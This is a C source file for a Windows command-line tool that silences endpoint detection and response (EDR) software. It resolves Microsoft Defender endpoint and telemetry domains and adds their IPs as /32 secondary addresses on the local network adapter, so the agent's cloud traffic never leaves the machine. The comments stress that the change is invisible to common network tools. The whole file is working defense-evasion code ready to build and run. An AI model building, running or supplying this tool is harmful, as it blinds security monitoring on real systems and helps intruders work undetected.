/*
 * 08_ip_sinkhole.c
 * IP Sinkholing — assign EDR cloud IPs as secondary IPs on local NIC
 *
 * By claiming an EDR's cloud IP address as a secondary IP on the local
 * network adapter, packets destined for that IP are delivered locally
 * (no service listening = connection refused). No packet ever leaves the NIC.
 *
 * No WFP, no IPSec, no routing changes visible in network tools.
 * Process: resolve EDR IPs → add each as secondary IP on first physical adapter.
 *
 * Build:
 *   cl 08_ip_sinkhole.c /link iphlpapi.lib ws2_32.lib
 *
 * Usage:
 *   08_ip_sinkhole.exe install             (resolve & sinkhole EDR IPs)
 *   08_ip_sinkhole.exe install <ip1> ...   (sinkhole specific IPs)
 *   08_ip_sinkhole.exe remove              (remove added secondary IPs)
 *   08_ip_sinkhole.exe list                (list secondary IPs on all adapters)
 */

#define WIN32_LEAN_AND_MEAN
#define _WINSOCK_DEPRECATED_NO_WARNINGS
#include <windows.h>
#include <iphlpapi.h>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <stdio.h>
#include <wchar.h>

#pragma comment(lib, "iphlpapi.lib")
#pragma comment(lib, "ws2_32.lib")

/* EDR cloud domains */
static const char *EDR_DOMAINS[] = {
    "endpoint.security.microsoft.com",
    "us.vortex-win.data.microsoft.com",
    "settings-win.data.microsoft.com",
    "events.data.microsoft.com",
    NULL
};

#define MAX_SINKHOLE_IPS 128
static DWORD   g_SinkholedIPs[MAX_SINKHOLE_IPS];
static int     g_SinkholedCount = 0;
static DWORD   g_AdapterIndex   = 0;    /* adapter we add IPs to */

static const WCHAR *SAVE_FILE = L"C:\\Windows\\Temp\\.ipsinkhole";

static void SaveState(void)
{
    FILE *f = NULL;
    _wfopen_s(&f, SAVE_FILE, L"w");
    if (!f) return;
    fwprintf(f, L"%lu\n", g_AdapterIndex);
    for (int i = 0; i < g_SinkholedCount; i++) {
        fwprintf(f, L"%lu\n", g_SinkholedIPs[i]);
    }
    fclose(f);
}

static int LoadState(void)
{
    FILE *f = NULL;
    _wfopen_s(&f, SAVE_FILE, L"r");
    if (!f) return 0;
    fwscanf_s(f, L"%lu", &g_AdapterIndex);
    DWORD ip;
    while (fwscanf_s(f, L"%lu", &ip) == 1 && g_SinkholedCount < MAX_SINKHOLE_IPS) {
        g_SinkholedIPs[g_SinkholedCount++] = ip;
    }
    fclose(f);
    return g_SinkholedCount;
}

/* Get the index of the first physical Ethernet/WiFi adapter */
static DWORD GetPrimaryAdapterIndex(void)
{
    ULONG size = sizeof(IP_ADAPTER_INFO) * 16;
    PIP_ADAPTER_INFO pInfo = (PIP_ADAPTER_INFO)HeapAlloc(GetProcessHeap(), 0, size);
    if (GetAdaptersInfo(pInfo, &size) != ERROR_SUCCESS) {
        HeapFree(GetProcessHeap(), 0, pInfo);
        return 0;
    }

    DWORD idx = 0;
    PIP_ADAPTER_INFO p = pInfo;
    while (p) {
        /* Skip loopback (type 24) and tunnel adapters */
        if (p->Type != MIB_IF_TYPE_LOOPBACK && p->Type != IF_TYPE_TUNNEL) {
            idx = p->Index;
            wprintf(L"[*] Using adapter: %S (index=%lu)\n", p->Description, idx);
            break;
        }
        p = p->Next;
    }
    HeapFree(GetProcessHeap(), 0, pInfo);
    return idx;
}

/* Add a secondary IP to the adapter */
static BOOL AddSecondaryIP(DWORD adapterIndex, DWORD ipNBO)
{
    if (g_SinkholedCount >= MAX_SINKHOLE_IPS) return FALSE;

    /* Check duplicate */
    for (int i = 0; i < g_SinkholedCount; i++) {
        if (g_SinkholedIPs[i] == ipNBO) return TRUE;
    }

    struct in_addr ia = { ipNBO };
    char buf[16];
    inet_ntop(AF_INET, &ia, buf, sizeof(buf));

    /* AddIPAddress adds a secondary IP to the specified adapter */
    UINT  nteMask   = 0xFFFFFFFF;    /* /32 — just this host */
    ULONG nteContext = 0, nteInstance = 0;

    DWORD err = AddIPAddress(
        ipNBO,          /* IP to add (network byte order) */
        nteMask,        /* subnet mask */
        adapterIndex,   /* adapter */
        &nteContext,    /* out: context handle for removal */
        &nteInstance    /* out: instance (not used) */
    );

    if (err != NO_ERROR) {
        wprintf(L"  [-] AddIPAddress %S failed: %lu\n", buf, err);
        if (err == ERROR_OBJECT_ALREADY_EXISTS)
            wprintf(L"      (IP already assigned — possibly already a cloud IP)\n");
        return FALSE;
    }

    g_SinkholedIPs[g_SinkholedCount++] = ipNBO;
    wprintf(L"  [+] Sinkholed: %S (context=%lu)\n", buf, nteContext);

    /* Note: nteContext is needed for DeleteIPAddress — we store the IP instead
     * and re-query context on removal */
    return TRUE;
}

/* Remove all secondary IPs we added */
static void RemoveAllSinkholes(void)
{
    if (LoadState() == 0) {
        wprintf(L"[-] No saved sinkhole state found.\n");
        return;
    }

    wprintf(L"[*] Removing %d sinkholed IP(s)...\n", g_SinkholedCount);

    /* Get current NTE table to find context handles */
    ULONG   tableSize = sizeof(MIB_IPADDRTABLE) + sizeof(MIB_IPADDRROW) * 64;
    PMIB_IPADDRTABLE pTable = (PMIB_IPADDRTABLE)HeapAlloc(GetProcessHeap(), 0, tableSize);

    while (GetIpAddrTable(pTable, &tableSize, FALSE) == ERROR_INSUFFICIENT_BUFFER) {
        HeapFree(GetProcessHeap(), 0, pTable);
        pTable = (PMIB_IPADDRTABLE)HeapAlloc(GetProcessHeap(), 0, tableSize);
    }

    for (int i = 0; i < g_SinkholedCount; i++) {
        DWORD targetIP = g_SinkholedIPs[i];

        /* Find the NTE context for this IP */
        for (DWORD j = 0; j < pTable->dwNumEntries; j++) {
            if (pTable->table[j].dwAddr == targetIP) {
                ULONG ctx = pTable->table[j].dwContext;
                DWORD err = DeleteIPAddress(ctx);

                struct in_addr ia = { targetIP };
                char buf[16];
                inet_ntop(AF_INET, &ia, buf, sizeof(buf));

                if (err == NO_ERROR) {
                    wprintf(L"  [+] Removed: %S\n", buf);
                } else {
                    wprintf(L"  [-] Failed to remove %S: %lu\n", buf, err);
                }
                break;
            }
        }
    }

    HeapFree(GetProcessHeap(), 0, pTable);
    DeleteFileW(SAVE_FILE);
    wprintf(L"[+] Done. Adapter configuration restored.\n");
}

static int ResolveAndSinkhole(const char *host, DWORD adapterIndex)
{
    struct addrinfo hints = {0};
    hints.ai_family   = AF_INET;
    hints.ai_socktype = SOCK_STREAM;

    struct addrinfo *result = NULL;
    if (getaddrinfo(host, NULL, &hints, &result) != 0) {
        wprintf(L"  [-] Cannot resolve: %S\n", host);
        return 0;
    }

    int added = 0;
    for (struct addrinfo *p = result; p != NULL; p = p->ai_next) {
        struct sockaddr_in *sin = (struct sockaddr_in *)p->ai_addr;
        if (AddSecondaryIP(adapterIndex, sin->sin_addr.s_addr)) added++;
    }

    freeaddrinfo(result);
    return added;
}

static void ListSecondaryIPs(void)
{
    ULONG size = sizeof(MIB_IPADDRTABLE) + sizeof(MIB_IPADDRROW) * 64;
    PMIB_IPADDRTABLE pTable = (PMIB_IPADDRTABLE)HeapAlloc(GetProcessHeap(), 0, size);
    if (GetIpAddrTable(pTable, &size, FALSE) != NO_ERROR) {
        HeapFree(GetProcessHeap(), 0, pTable);
        return;
    }

    wprintf(L"%-18s  %-18s  %-6s  %s\n",
            L"IP Address", L"Subnet Mask", L"IfIdx", L"Context");
    for (DWORD i = 0; i < pTable->dwNumEntries; i++) {
        MIB_IPADDRROW *r = &pTable->table[i];
        struct in_addr iaIP   = { r->dwAddr };
        struct in_addr iaMask = { r->dwMask };
        char ipBuf[16], maskBuf[16];
        inet_ntop(AF_INET, &iaIP,   ipBuf,   sizeof(ipBuf));
        inet_ntop(AF_INET, &iaMask, maskBuf, sizeof(maskBuf));
        wprintf(L"%-18S  %-18S  %-6lu  %lu\n",
                ipBuf, maskBuf, r->dwIndex, r->dwContext);
    }
    HeapFree(GetProcessHeap(), 0, pTable);
}

int main(int argc, char *argv[])
{
    WSADATA wsd;
    WSAStartup(MAKEWORD(2,2), &wsd);

    wprintf(L"[*] IP Sinkhole Tool\n\n");

    if (argc < 2) {
        wprintf(L"Usage:\n");
        wprintf(L"  %S install             Resolve & sinkhole all EDR IPs\n", argv[0]);
        wprintf(L"  %S install <ip1> ...   Sinkhole specific IPs\n", argv[0]);
        wprintf(L"  %S remove              Remove all sinkholes\n", argv[0]);
        wprintf(L"  %S list                List all interface IPs\n", argv[0]);
        WSACleanup();
        return 1;
    }

    if (strcmp(argv[1], "list") == 0) {
        ListSecondaryIPs();
        WSACleanup();
        return 0;
    }

    if (strcmp(argv[1], "remove") == 0) {
        RemoveAllSinkholes();
        WSACleanup();
        return 0;
    }

    if (strcmp(argv[1], "install") == 0) {
        g_AdapterIndex = GetPrimaryAdapterIndex();
        if (g_AdapterIndex == 0) {
            wprintf(L"[-] Could not find a suitable network adapter.\n");
            WSACleanup();
            return 1;
        }

        if (argc >= 3) {
            for (int i = 2; i < argc; i++) {
                DWORD ip = inet_addr(argv[i]);
                if (ip == INADDR_NONE) {
                    /* Try resolving as hostname */
                    ResolveAndSinkhole(argv[i], g_AdapterIndex);
                } else {
                    AddSecondaryIP(g_AdapterIndex, ip);
                }
            }
        } else {
            wprintf(L"[*] Resolving and sinkholing EDR domains...\n\n");
            for (int i = 0; EDR_DOMAINS[i] != NULL; i++) {
                wprintf(L"[*] %S\n", EDR_DOMAINS[i]);
                ResolveAndSinkhole(EDR_DOMAINS[i], g_AdapterIndex);
            }
        }

        SaveState();
        wprintf(L"\n[+] %d IP(s) sinkholes installed.\n", g_SinkholedCount);
        wprintf(L"[+] Traffic to those IPs is now delivered locally (no packet leaves NIC).\n");
        wprintf(L"[*] Run with 'remove' to restore.\n");
        WSACleanup();
        return 0;
    }

    wprintf(L"[-] Unknown command: %S\n", argv[1]);
    WSACleanup();
    return 1;
}
